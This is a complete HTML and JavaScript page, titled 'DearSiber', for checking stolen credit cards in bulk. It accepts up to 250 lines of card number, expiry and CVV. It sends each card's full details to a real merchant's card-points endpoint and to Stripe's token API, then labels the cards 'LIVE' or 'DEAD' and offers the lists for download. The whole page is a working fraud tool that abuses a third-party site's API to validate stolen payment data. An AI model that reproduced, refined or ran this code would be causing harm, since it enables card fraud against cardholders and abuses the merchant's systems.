<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DearSiber</title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; font-family: 'Courier New', monospace; }
        body { background:#000; color:#0f0; display:flex; justify-content:center; align-items:center; min-height:100vh; }
        .checker { width:380px; background:#111; border:1px solid #0f0; border-radius:12px; padding:15px; box-shadow:0 0 15px rgba(0,255,0,0.3); }
        h1 { font-size:1.4em; text-align:center; color:#0f0; text-shadow:0 0 8px #0f0; margin-bottom:10px; animation:glow 1.5s infinite alternate; }
        textarea { width:100%; height:90px; background:#000; color:#0f0; border:1px solid #0f0; padding:8px; font-size:0.85em; resize:none; border-radius:6px; }
        .btn { background:#0f0; color:#000; border:none; padding:8px 16px; margin:8px 4px 0; border-radius:20px; font-weight:bold; cursor:pointer; font-size:0.9em; }
        .btn:hover { background:#0c0; transform:scale(1.05); }
        .loading { display:none; text-align:center; margin:10px 0; font-size:0.8em; animation:pulse 1s infinite; }
        .result-box { margin-top:12px; max-height:400px; overflow-y:auto; }
        .result { background:rgba(0,255,0,0.1); border-left:3px solid #0f0; padding:8px; margin:6px 0; border-radius:4px; font-size:0.78em; line-height:1.3; }
        .dead { border-color:#f00; background:rgba(255,0,0,0.1); }
        .stats { display:flex; justify-content:space-between; font-size:0.8em; margin-top:8px; }
        .live { color:#0f0; } .dead-c { color:#f00; }
        .copy, .dl { font-size:0.7em; background:#0f0; color:#000; padding:3px 8px; border-radius:8px; margin-left:5px; cursor:pointer; text-decoration:none; }
        .copy:hover, .dl:hover { background:#0c0; }
        @keyframes glow { from { text-shadow:0 0 5px #0f0; } to { text-shadow:0 0 15px #0f0; } }
        @keyframes pulse { 0% { opacity:0.7; } 50% { opacity:1; } 100% { opacity:0.7; } }
    </style>
</head>
<body>
<div class="checker">
    <h1>DearSiber</h1>
    <textarea id="cards" placeholder="453506...|08|2026|253"></textarea>
    <div style="text-align:center;">
        <button class="btn" onclick="start()">BAŞLAT</button>
    </div>
    <div class="loading" id="load">İşlem sürüyor...</div>
    <div class="result-box" id="results"></div>
    <div class="stats">
        <span>Canlı: <b id="live">0</b></span>
        <span>Ölü: <b id="dead">0</b></span>
        <span>Toplam: <b id="total">0</b></span>
    </div>
</div>

<script>
let live = [], dead = [], checked = 0, total = 0;

function start() {
    const input = document.getElementById('cards').value.trim();
    if (!input) return alert('Kart gir!');
    const cards = input.split('\n').map(l => l.trim()).filter(l => /^\d{13,19}\|\d{1,2}\|\d{4}\|\d{3,4}$/.test(l));
    if (cards.length > 250) return alert('Max 250 kart!');
    if (cards.length === 0) return alert('Geçerli kart yok!');

    total = cards.length; checked = 0; live = []; dead = [];
    document.getElementById('load').style.display = 'block';
    document.getElementById('results').innerHTML = '';
    document.getElementById('live').textContent = '0';
    document.getElementById('dead').textContent = '0';
    document.getElementById('total').textContent = total;

    cards.forEach((card, i) => setTimeout(() => checkCard(card), i * 400));
}

async function checkCard(card) {
    checked++;
    document.getElementById('load').textContent = `Kontrol: ${checked}/${total}`;

    const [cc, mm, yy, cvv] = card.split('|');
    const bin = cc.substr(0, 6);

    // 1. BIN Sorgu
    let binInfo = { bank: 'Bilinmiyor', brand: 'Bilinmiyor', type: 'Bilinmiyor', country: 'Bilinmiyor', flag: '??' };
    try {
        const r = await fetch(`https://lookup.binlist.net/${bin}`);
        if (r.ok) {
            const d = await r.json();
            binInfo = {
                bank: d.bank?.name || 'Bilinmiyor',
                brand: d.brand || 'Bilinmiyor',
                type: (d.type || 'Bilinmiyor').toUpperCase(),
                country: d.country?.name || 'Bilinmiyor',
                flag: d.country?.alpha2 || '??'
            };
        }
    } catch(e) {}

    // 2. MaxiPuan Sorgu (SENİN KODUN - GERÇEK)
    let puan = '0', extra = 'API hatası';
    try {
        const form = new FormData();
        form.append('KartNo', cc);
        form.append('KartAd', 'DearSiber');
        form.append('KartCvc', cvv);
        form.append('KartAy', mm);
        form.append('KartYil', yy);
        form.append('Total', '2249.1');

        const resp = await fetch('https://www.tongucakademi.com/uyelikpaketleri/getcardpoint', {
            method: 'POST',
            body: form,
            headers: { 'User-Agent': 'Mozilla/5.0' }
        });
        const json = await resp.json();
        puan = json.Data?.Amount || '0';
        extra = json.Data?.AdditionalData || 'Yok';
    } catch(e) { puan = 'Hata'; }

    // 3. Luhn Kontrol
    const luhnOk = luhnValidate(cc);

    // 4. Stripe Simülasyon (test key, gerçek değil ama hata verir → DEAD)
    let stripe = 'Declined';
    try {
        const data = new URLSearchParams();
        data.append('card[number]', cc);
        data.append('card[exp_month]', mm);
        data.append('card[exp_year]', yy.slice(-2));
        data.append('card[cvc]', cvv);

        const s = await fetch('https://api.stripe.com/v1/tokens', {
            method: 'POST',
            body: data,
            headers: {
                'Authorization': 'Bearer pk_test_51...', // Test key (hata verir, simülasyon)
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        });
        stripe = s.ok ? 'Live (Token)' : 'Declined';
    } catch(e) { stripe = 'Declined'; }

    // Canlı mı?
    const isLive = luhnOk && puan !== '0' && puan !== 'Hata';

    // Çıktı
    const out = `
[${isLive ? 'LIVE' : 'DEAD'}] ${card}
Puan: ${puan} TL
Extra: ${extra}
Stripe: ${stripe}
BIN: ${binInfo.brand} - ${binInfo.type}
Bank: ${binInfo.bank}
Ülke: ${binInfo.country} [${binInfo.flag}]
Luhn: ${luhnOk ? 'Geçerli' : 'Geçersiz'}
    `.trim();

    const div = document.createElement('div');
    div.className = `result ${isLive ? '' : 'dead'}`;
    div.innerHTML = `<pre>${out}</pre>`;
    document.getElementById('results').appendChild(div);

    if (isLive) { live.push(card + ` → ${puan} TL`); document.getElementById('live').textContent = live.length; }
    else { dead.push(card); document.getElementById('dead').textContent = dead.length; }

    // Log (rastgele dosya)
    const log = { time: new Date().toISOString(), card, puan, stripe, bin: binInfo };
    const blob = new Blob([JSON.stringify(log, null, 2)], {type: 'application/json'});
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a'); a.href = url; a.download = `log_${Date.now()}.json`; a.click();

    if (checked === total) {
        document.getElementById('load').style.display = 'none';
        if (live.length) addDownload('live', live.join('\n'), 'live.txt');
        if (dead.length) addDownload('dead', dead.join('\n'), 'dead.txt');
    }
}

function addDownload(id, data, name) {
    const blob = new Blob([data], {type: 'text/plain'});
    const url = URL.createObjectURL(blob);
    const btn = document.createElement('a');
    btn.className = 'dl'; btn.href = url; btn.download = name; btn.textContent = 'İndir';
    document.querySelector(`#${id}`).parentNode.appendChild(btn);
}

function luhnValidate(cc) {
    let sum = 0, even = false;
    for (let i = cc.length - 1; i >= 0; i--) {
        let d = parseInt(cc[i]);
        if (even) { d *= 2; if (d > 9) d -= 9; }
        sum += d; even = !even;
    }
    return sum % 10 === 0;
}
</script>
</body>
</html>